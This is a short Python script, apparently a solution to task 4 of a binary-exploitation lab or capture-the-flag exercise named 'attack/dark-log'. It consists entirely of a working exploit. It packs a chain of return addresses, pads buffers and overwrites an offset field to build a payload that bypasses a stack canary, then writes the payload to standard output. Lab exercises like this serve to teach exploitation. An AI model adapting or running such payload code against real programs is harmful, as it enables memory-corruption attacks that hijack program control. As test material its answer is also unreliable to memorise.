#!/usr/bin/env python3
"""Task 4: build the canary-bypass payload for attack/dark-log."""
import struct
import sys

p64 = lambda x: struct.pack("<Q", x)

chain = p64(0x4018A3) + p64(4) + p64(0x4018A4) + p64(0x401677)
payload = chain.ljust(128, b"X")
payload += b"Y" * 128
payload += struct.pack("<i", 168)
payload += b"Z" * 4
payload += b"W" * 8

sys.stdout.buffer.write(payload)
